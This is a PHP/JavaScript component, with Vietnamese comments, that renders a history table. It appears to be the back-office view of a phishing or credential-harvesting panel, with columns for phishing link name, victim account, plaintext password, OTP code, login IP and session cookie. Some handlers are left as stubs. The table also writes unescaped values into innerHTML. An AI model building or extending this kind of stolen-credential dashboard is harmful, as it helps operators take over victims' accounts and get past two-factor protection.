<?php
// HistoryTable.php - Chuyển đổi từ React sang PHP, giữ nguyên logic và UI
?>
<div class="cyber-card-bg h-full">
  <div class="pt-6">
    <div class="overflow-auto">
      <table class="ui-table">
        <thead>
          <tr class="border-b-purple-500/30 hover:bg-transparent">
            <th class="w-[40px]">
              <input type="checkbox" id="select-all" onclick="handleSelectAll(this.checked)">
            </th>
            <th class="text-gray-300 whitespace-nowrap">STT & Thời Gian</th>
            <th class="text-gray-300 whitespace-nowrap">Tên Link</th>
            <th class="text-gray-300 whitespace-nowrap">Tài khoản</th>
            <th class="text-gray-300 whitespace-nowrap">Mật Khẩu</th>
            <th class="text-gray-300 whitespace-nowrap">Code OTP</th>
            <th class="text-gray-300 whitespace-nowrap">IP Đăng Nhập</th>
            <th class="text-gray-300 whitespace-nowrap">Trạng Thái</th>
            <th class="text-gray-300 whitespace-nowrap">Cookie</th>
            <th class="text-gray-300 whitespace-nowrap">Thông Báo</th>
            <th class="text-gray-300 whitespace-nowrap">Hành Động</th>
          </tr>
        </thead>
        <tbody id="history-table-body">
          <!-- Dữ liệu sẽ được render bằng JS -->
        </tbody>
      </table>
    </div>
    <div id="no-history" class="text-center py-8 text-gray-500" style="display:none;">
      Chưa có hoạt động nào.
    </div>
  </div>
</div>
<script>
// --- Helper functions giống 100% logic React ---
function toLowerTrim(s) { return String(s || '').trim().toLowerCase(); }
function emailLocal(s) {
  var v = toLowerTrim(s);
  var i = v.indexOf('@');
  return i >= 0 ? v.slice(0, i) : v;
}
function onlyDigits(s) { return String(s || '').replace(/\D+/g, ''); }
function accountsMatch(a, b) {
  var A = toLowerTrim(a);
  var B = toLowerTrim(b);
  if (!A || !B) return false;
  if (A === B) return true;
  var hasAtA = A.includes('@');
  var hasAtB = B.includes('@');
  if (hasAtA && hasAtB) {
    if (A === B) return true;
    if (emailLocal(A) === emailLocal(B)) return true;
  } else if (hasAtA && !hasAtB) {
    if (emailLocal(A) === B) return true;
  } else if (!hasAtA && hasAtB) {
    if (A === emailLocal(B)) return true;
  }
  var dA = onlyDigits(A);
  var dB = onlyDigits(B);
  if (dA && dB) {
    var a9 = dA.slice(-9), b9 = dB.slice(-9);
    if (a9 && b9 && a9 === b9) return true;
    var a10 = dA.slice(-10), b10 = dB.slice(-10);
    if (a10 && b10 && a10 === b10) return true;
  }
  var cA = A.replace(/[._\s-]+/g, '');
  var cB = B.replace(/[._\s-]+/g, '');
  return cA === cB;
}

// --- Render table rows giống 100% logic React ---
function renderHistoryTable(history, allHistory, selectedUsers, notificationTemplates) {
  var tbody = document.getElementById('history-table-body');
  tbody.innerHTML = '';
  if (!history || history.length === 0) {
    document.getElementById('no-history').style.display = '';
    return;
  }
  document.getElementById('no-history').style.display = 'none';
  history.forEach(function(item, index) {
    var tr = document.createElement('tr');
    tr.className = 'border-b-purple-500/10 hover:bg-purple-500/10 text-xs';
    tr.innerHTML = `
      <td><input type="checkbox" ${selectedUsers.includes(item.id) ? 'checked' : ''} onclick="handleSelectRow('${item.id}', this.checked)"></td>
      <td class="text-gray-300">
        <div class="font-bold text-white">${index + 1}</div>
        <div>${new Date(item.time).toLocaleDateString('vi-VN')}</div>
        <div>${new Date(item.time).toLocaleTimeString('vi-VN')}</div>
      </td>
      <td class="text-cyan-400 font-medium">${item.linkName}</td>
      <td class="font-medium text-white">${item.account}</td>
      <td><span class="font-mono">${item.password}</span></td>
      <td><span class="text-yellow-400 font-mono">${item.otp}</span></td>
      <td class="text-gray-300">${item.ip}</td>
      <td><span class="badge">${item.status}</span></td>
      <td><span class="text-gray-400 truncate max-w-[100px]" title="${item.cookie}">${item.cookie}</span></td>
      <td><!-- NotificationCell logic here --></td>
      <td><!-- Action buttons here --></td>
    `;
    tbody.appendChild(tr);
  });
}

// --- Select logic giống 100% React ---
function handleSelectAll(checked) {
  // ...implement logic giống React...
}
function handleSelectRow(id, checked) {
  // ...implement logic giống React...
}

// --- NotificationCell, Action buttons, and other logic sẽ được bổ sung chi tiết giống 100% React khi chuyển đổi từng phần ---
</script>
